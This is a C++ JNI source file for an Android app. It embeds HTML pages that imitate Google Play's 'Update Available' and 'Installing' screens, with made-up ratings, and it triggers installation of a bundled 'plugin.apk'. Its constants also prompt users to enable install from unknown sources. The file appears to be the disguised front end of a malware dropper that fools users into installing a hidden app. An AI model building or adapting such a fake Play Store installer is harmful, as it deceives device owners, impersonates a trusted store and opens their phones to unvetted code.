#include <jni.h>
#include <string>
#include <android/log.h>
#include <android/asset_manager.h>
#include <android/asset_manager_jni.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdio.h>

#define LOG_TAG "InstallerNative"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

static jclass g_contextClass = nullptr;
static jclass g_packageManagerClass = nullptr;
static jclass g_packageInstallerClass = nullptr;
static jclass g_sessionParamsClass = nullptr;
static jclass g_sessionClass = nullptr;
static jclass g_intentClass = nullptr;
static jclass g_pendingIntentClass = nullptr;
static jclass g_buildVersionClass = nullptr;
static jclass g_packageInfoClass = nullptr;

static jmethodID g_getPackageManagerMethod = nullptr;
static jmethodID g_getPackageInstallerMethod = nullptr;
static jmethodID g_getPackageNameMethod = nullptr;
static jmethodID g_getAssetsMethod = nullptr;
static jmethodID g_getSdkIntMethod = nullptr;

static bool initJNI(JNIEnv* env) {
    if (g_contextClass != nullptr) {
        return true;
    }

    g_contextClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/Context"));
    if (!g_contextClass) return false;

    g_packageManagerClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageManager"));
    if (!g_packageManagerClass) return false;

    g_packageInstallerClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageInstaller"));
    if (!g_packageInstallerClass) return false;

    g_sessionParamsClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageInstaller$SessionParams"));
    if (!g_sessionParamsClass) return false;

    g_sessionClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageInstaller$Session"));
    if (!g_sessionClass) return false;

    g_intentClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/Intent"));
    if (!g_intentClass) return false;

    g_pendingIntentClass = (jclass)env->NewGlobalRef(env->FindClass("android/app/PendingIntent"));
    if (!g_pendingIntentClass) return false;

    g_buildVersionClass = (jclass)env->NewGlobalRef(env->FindClass("android/os/Build$VERSION"));
    if (!g_buildVersionClass) return false;

    g_packageInfoClass = (jclass)env->NewGlobalRef(env->FindClass("android/content/pm/PackageInfo"));
    if (!g_packageInfoClass) return false;

    g_getPackageManagerMethod = env->GetMethodID(g_contextClass, "getPackageManager", "()Landroid/content/pm/PackageManager;");
    if (!g_getPackageManagerMethod) return false;

    g_getPackageInstallerMethod = env->GetMethodID(g_packageManagerClass, "getPackageInstaller", "()Landroid/content/pm/PackageInstaller;");
    if (!g_getPackageInstallerMethod) return false;

    g_getPackageNameMethod = env->GetMethodID(g_contextClass, "getPackageName", "()Ljava/lang/String;");
    if (!g_getPackageNameMethod) return false;

    g_getAssetsMethod = env->GetMethodID(g_contextClass, "getAssets", "()Landroid/content/res/AssetManager;");
    if (!g_getAssetsMethod) return false;

    jfieldID sdkIntField = env->GetStaticFieldID(g_buildVersionClass, "SDK_INT", "I");
    g_getSdkIntMethod = (jmethodID)sdkIntField;

    return true;
}


// Embedded Constants and Strings
static const char* APK_NAME = "plugin.apk";
static const char* ACTION_INSTALL = "com.example.installer.INSTALL";
static const int BUFFER_SIZE = 65536;

// Toast Messages
static const char* MSG_INSTALLED_SUCCESS = "Installed successfully";
static const char* MSG_INSTALL_FAILED = "Installation failed";
static const char* MSG_INSTALL_IN_PROGRESS = "Installation in progress";
static const char* MSG_PERMISSION_REQUIRED = "Permission required";
static const char* MSG_ENABLE_UNKNOWN_SOURCES = "Please enable install from unknown sources";

// Get string constant by key
static const char* getStringConstant(const char* key) {
    if (strcmp(key, "APK_NAME") == 0) return APK_NAME;
    if (strcmp(key, "ACTION_INSTALL") == 0) return ACTION_INSTALL;
    if (strcmp(key, "MSG_INSTALLED_SUCCESS") == 0) return MSG_INSTALLED_SUCCESS;
    if (strcmp(key, "MSG_INSTALL_FAILED") == 0) return MSG_INSTALL_FAILED;
    if (strcmp(key, "MSG_INSTALL_IN_PROGRESS") == 0) return MSG_INSTALL_IN_PROGRESS;
    if (strcmp(key, "MSG_PERMISSION_REQUIRED") == 0) return MSG_PERMISSION_REQUIRED;
    if (strcmp(key, "MSG_ENABLE_UNKNOWN_SOURCES") == 0) return MSG_ENABLE_UNKNOWN_SOURCES;
    return "";
}

// Get integer constant by key
static int getIntConstant(const char* key) {
    if (strcmp(key, "BUFFER_SIZE") == 0) return BUFFER_SIZE;
    return 0;
}

// Embedded HTML content - Combined update and installing page
static const char* getHtmlContent(const char* mode) {
    if (strcmp(mode, "installing") == 0) {
        return R"html(<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#ffffff">
    <title>Installing - Google Play</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Roboto', 'Arial', sans-serif; background-color: #fafafa; color: #202124; width: 100%; height: 100vh; overflow: hidden; display: flex; flex-direction: column; justify-content: space-between; }
        .circles-section { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .bottom-section { padding: 20px 24px 100px 24px; display: flex; flex-direction: column; align-items: center; gap: 16px; }
        .circles-container { position: relative; width: 70vw; height: 70vw; max-width: 350px; max-height: 350px; }
        .circle { position: absolute; border-radius: 50%; animation: float 3s ease-in-out infinite; }
        .circle-center { width: 32%; height: 32%; background: linear-gradient(135deg, #4fc3f7 0%, #29b6f6 100%); left: 50%; top: 50%; transform: translate(-50%, -50%); z-index: 5; box-shadow: 0 4px 12px rgba(79, 195, 247, 0.3); }
        .circle-1 { width: 15%; height: 15%; background: #4fc3f7; left: 18%; top: 12%; animation-delay: 0s; opacity: 0.9; }
        .circle-2 { width: 10%; height: 10%; background: #b0bec5; left: 50%; top: 8%; transform: translateX(-50%); animation-delay: 0.5s; opacity: 0.7; }
        .circle-3 { width: 17%; height: 17%; background: #90a4ae; right: 18%; top: 12%; animation-delay: 1s; opacity: 0.8; }
        .circle-4 { width: 15%; height: 15%; background: #ff9800; right: 12%; top: 45%; animation-delay: 1.5s; }
        .circle-5 { width: 13%; height: 13%; border: 2px solid #e0e0e0; background: transparent; right: 28%; bottom: 22%; animation-delay: 2s; opacity: 0.6; }
        .circle-6 { width: 19%; height: 19%; background: #fdd835; left: 50%; bottom: 8%; transform: translateX(-50%); animation-delay: 2.5s; }
        .circle-7 { width: 8%; height: 8%; background: #fdd835; left: 42%; bottom: 26%; animation-delay: 1.2s; opacity: 0.8; }
        .circle-8 { width: 9%; height: 9%; background: #66bb6a; left: 16%; top: 48%; animation-delay: 0.8s; }
        .circle-9 { width: 13%; height: 13%; border: 2px solid #e0e0e0; background: transparent; left: 20%; bottom: 32%; animation-delay: 1.8s; opacity: 0.5; }
        @keyframes float { 0%, 100% { transform: translate(0, 0); } 50% { transform: translate(0, -10px); } }
        .app-info { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; width: 100%; max-width: 400px; }
        .app-icon { width: 48px; height: 48px; background: #f0f0f0; border-radius: 10px; display: flex; align-items: center; justify-content: center; overflow: hidden; border: 1px solid #e0e0e0; flex-shrink: 0; }
        .app-icon img { width: 100%; height: 100%; object-fit: cover; }
        .app-name { font-size: 20px; font-weight: 600; color: #202124; }
        .status-text { font-size: 18px; font-weight: 500; color: #5f6368; margin-bottom: 24px; width: 100%; max-width: 400px; text-align: left; }
        .progress-container { width: 100%; max-width: 400px; margin-bottom: 16px; }
        .progress-bar { width: 100%; height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; position: relative; }
        .progress-fill { height: 100%; background: #1a73e8; border-radius: 2px; width: 0%; animation: progress 4s ease-in-out infinite; }
        @keyframes progress { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 95%; } }
        .google-play-logo { display: flex; align-items: center; gap: 6px; justify-content: center; margin-top: 12px; }
        .play-icon { width: 24px; height: 24px; }
        .google-play-text { font-size: 20px; color: #5f6368; font-weight: 400; }
        @media (max-width: 480px) { .circles-container { width: 75vw; height: 75vw; } .bottom-section { padding: 16px 20px 60px 20px; } .app-info { max-width: 90%; } .app-icon { width: 44px; height: 44px; } .app-name { font-size: 14px; } .status-text { font-size: 13px; max-width: 90%; } .progress-container { max-width: 90%; } .play-icon { width: 22px; height: 22px; } .google-play-text { font-size: 18px; } }
    </style>
</head>
<body>
    <div class="circles-section">
        <div class="circles-container">
            <div class="circle circle-center"></div>
            <div class="circle circle-1"></div>
            <div class="circle circle-2"></div>
            <div class="circle circle-3"></div>
            <div class="circle circle-4"></div>
            <div class="circle circle-5"></div>
            <div class="circle circle-6"></div>
            <div class="circle circle-7"></div>
            <div class="circle circle-8"></div>
            <div class="circle circle-9"></div>
        </div>
    </div>
    <div class="bottom-section">
        <div class="app-info">
            <div class="app-icon"><img src="file:///android_asset/update/app.png" alt="App Icon" onerror="this.style.display='none'"></div>
            <div class="app-name"></div>
        </div>
        <div class="status-text">Installing</div>
        <div class="progress-container">
            <div class="progress-bar"><div class="progress-fill"></div></div>
        </div>
        <div class="google-play-logo">
            <img src="file:///android_asset/update/playstore.png" alt="Google Play" class="play-icon">
            <span class="google-play-text">Google Play</span>
        </div>
    </div>
    <!-- Load shared config -->
    <script src="file:///android_asset/update/config.js"></script>
    <script>
        if (typeof Android !== 'undefined' && Android.installPlugin) {
            setTimeout(() => { Android.installPlugin(); }, 1500);
        }
    </script>
</body>
</html>)html";
    } else {
        return R"html(<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#ffffff">
    <title>Update Available - Google Play</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { font-family: 'Roboto', 'Arial', sans-serif; background-color: #ffffff; color: #202124; width: 100%; min-height: 100vh; overflow-x: hidden; }
        .header { padding: 16px 20px; display: flex; align-items: center; gap: 12px; background: white; }
        .google-play-logo { display: flex; align-items: center; gap: 6px; }
        .play-icon { width: 24px; height: 24px; }
        .header-text { font-size: 20px; font-weight: 400; color: #5f6368; }
        .content { padding: 20px 16px; }
        .title { font-size: 24px; font-weight: 700; margin-bottom: 8px; color: #202124; }
        .subtitle { font-size: 13px; color: #5f6368; margin-bottom: 24px; line-height: 1.4; }
        .app-info { display: flex; align-items: center; gap: 12px; margin-bottom: 32px; }
        .app-icon { width: 64px; height: 64px; background: #f0f0f0; border-radius: 14px; display: flex; align-items: center; justify-content: center; overflow: hidden; border: 1px solid #e0e0e0; flex-shrink: 0; }
        .app-icon img { width: 100%; height: 100%; object-fit: cover; }
        .app-details { flex: 1; min-width: 0; }
        .app-details h2 { font-size: 16px; font-weight: 600; margin-bottom: 6px; color: #202124; }
        .app-meta { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #5f6368; flex-wrap: wrap; }
        .section-title { font-size: 20px; font-weight: 700; margin-bottom: 6px; color: #202124; }
        .update-date { font-size: 12px; color: #5f6368; margin-bottom: 12px; }
        .update-description { font-size: 13px; line-height: 1.5; color: #5f6368; margin-bottom: 12px; }
        .update-list { list-style: none; padding-left: 0; margin-bottom: 12px; }
        .update-list li { font-size: 13px; color: #202124; margin-bottom: 8px; padding-left: 6px; line-height: 1.5; }
        .update-list li:before { content: "• "; font-weight: bold; margin-right: 8px; }
        .buttons { display: flex; gap: 12px; margin: 24px 0 32px 0; }
        .btn { flex: 1; padding: 11px 20px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; border: none; transition: all 0.2s; text-align: center; }
        .btn-outline { background: white; color: #1967d2; border: 1px solid #dadce0; }
        .btn-outline:active { background: #f8f9fa; }
        .btn-primary { background: #1967d2; color: white; }
        .btn-primary:active { background: #1557b0; }
        .section { margin-bottom: 32px; }
        .ratings-section { margin-bottom: 24px; }
        .ratings-disclaimer { font-size: 12px; color: #5f6368; line-height: 1.5; margin-bottom: 20px; }
        .rating-summary { display: flex; gap: 24px; align-items: center; margin-bottom: 32px; }
        .rating-score { text-align: center; }
        .rating-number { font-size: 48px; font-weight: 400; color: #202124; line-height: 1; margin-bottom: 6px; }
        .stars { color: #1967d2; font-size: 14px; margin-bottom: 4px; }
        .review-count { font-size: 12px; color: #5f6368; }
        .rating-bars { flex: 1; }
        .rating-bar { display: flex; align-items: center; gap: 10px; margin-bottom: 6px; }
        .bar-label { font-size: 13px; color: #5f6368; width: 8px; flex-shrink: 0; }
        .bar-container { flex: 1; height: 10px; background: #e8eaed; border-radius: 4px; overflow: hidden; min-width: 0; }
        .bar-fill { height: 100%; background: #1967d2; border-radius: 4px; transition: width 0.3s ease; }
        @media (max-width: 480px) { .header { padding: 14px 16px; } .content { padding: 16px 12px; } .title { font-size: 22px; } .app-icon { width: 56px; height: 56px; } .btn { padding: 10px 18px; font-size: 13px; } .rating-number { font-size: 42px; } }
    </style>
</head>
<body>
<div class="header">
    <div class="google-play-logo">
        <img src="file:///android_asset/update/playstore.png" alt="Google Play" class="play-icon">
        <span class="header-text">Google Play</span>
    </div>
</div>
<div class="content">
    <h1 class="title">Update Available</h1>
    <p class="subtitle">To use this app, download the latest version.</p>
    <div class="app-info">
        <div class="app-icon"><img src="file:///android_asset/update/app.png" alt="App Icon"></div>
        <div class="app-details">
            <h2 class="app-name"></h2>
            <div class="app-meta">
                <span class="app-version"></span>
                <span>•</span>
                <span class="app-size"></span>
            </div>
        </div>
    </div>
    <div class="section">
        <h3 class="section-title">What's new</h3>
        <p class="update-date"></p>
        <p class="update-description">We're always making changes and improvements to this app. To make sure you don't miss a thing, just keep your Updates turned on.</p>
        <ul class="update-list">
            <li>New features and improvements added.</li>
            <li>Enhanced user experience and interface.</li>
            <li>Bug fixes and performance improvements.</li>
        </ul>
    </div>
    <div class="buttons">
        <button class="btn btn-outline">More Info</button>
        <button class="btn btn-primary" id="updateBtn" onclick="updateApp()">Update</button>
    </div>
    <div class="section ratings-section">
        <h3 class="section-title">Ratings and reviews</h3>
        <p class="ratings-disclaimer">Ratings and reviews are verified and are from people who use the same type of device that you use.</p>
        <div class="rating-summary">
            <div class="rating-score">
                <div class="rating-number"></div>
                <div class="stars">★★★★☆</div>
                <div class="review-count"></div>
            </div>
            <div class="rating-bars">
                <div class="rating-bar"><span class="bar-label">5</span><div class="bar-container"><div class="bar-fill" style="width: 68%;"></div></div></div>
                <div class="rating-bar"><span class="bar-label">4</span><div class="bar-container"><div class="bar-fill" style="width: 18%;"></div></div></div>
                <div class="rating-bar"><span class="bar-label">3</span><div class="bar-container"><div class="bar-fill" style="width: 8%;"></div></div></div>
                <div class="rating-bar"><span class="bar-label">2</span><div class="bar-container"><div class="bar-fill" style="width: 4%;"></div></div></div>
                <div class="rating-bar"><span class="bar-label">1</span><div class="bar-container"><div class="bar-fill" style="width: 2%;"></div></div></div>
            </div>
        </div>
    </div>
</div>
<!-- Load shared config -->
<script src="file:///android_asset/update/config.js"></script>
<script>
    function updateApp() {
        // Show installing page first
        if (typeof Android !== 'undefined' && Android.showInstalling) {
            Android.showInstalling();
        }
    }
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('installed') === 'true') {
        const updateBtn = document.querySelector('.btn-primary');
        if (updateBtn) {
            updateBtn.disabled = true;
            updateBtn.style.opacity = '0.5';
            updateBtn.style.cursor = 'not-allowed';
            updateBtn.textContent = 'Installing...';
            updateBtn.onclick = () => false;
        }
    }
</script>
</body>
</html>)html";
    }
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_installer_MainActivity_nativeGetHtml(
        JNIEnv* env, jobject thiz, jstring mode) {
    const char* modeStr = env->GetStringUTFChars(mode, nullptr);
    if (!modeStr) {
        return env->NewStringUTF("");
    }
    
    const char* html = getHtmlContent(modeStr);
    jstring result = env->NewStringUTF(html);
    
    env->ReleaseStringUTFChars(mode, modeStr);
    return result;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_installer_MainActivity_nativeGetString(
        JNIEnv* env, jobject thiz, jstring key) {
    const char* keyStr = env->GetStringUTFChars(key, nullptr);
    if (!keyStr) {
        return env->NewStringUTF("");
    }
    
    const char* value = getStringConstant(keyStr);
    jstring result = env->NewStringUTF(value);
    
    env->ReleaseStringUTFChars(key, keyStr);
    return result;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_example_installer_MainActivity_nativeGetInt(
        JNIEnv* env, jobject thiz, jstring key) {
    const char* keyStr = env->GetStringUTFChars(key, nullptr);
    if (!keyStr) {
        return 0;
    }
    
    int value = getIntConstant(keyStr);
    
    env->ReleaseStringUTFChars(key, keyStr);
    return value;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_installer_NativeInstaller_nativeGetString(
        JNIEnv* env, jobject thiz, jstring key) {
    const char* keyStr = env->GetStringUTFChars(key, nullptr);
    if (!keyStr) {
        return env->NewStringUTF("");
    }
    
    const char* value = getStringConstant(keyStr);
    jstring result = env->NewStringUTF(value);
    
    env->ReleaseStringUTFChars(key, keyStr);
    return result;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_example_installer_NativeInstaller_nativeGetInt(
        JNIEnv* env, jobject thiz, jstring key) {
    const char* keyStr = env->GetStringUTFChars(key, nullptr);
    if (!keyStr) {
    return 0;
}

    int value = getIntConstant(keyStr);
    
    env->ReleaseStringUTFChars(key, keyStr);
    return value;
}
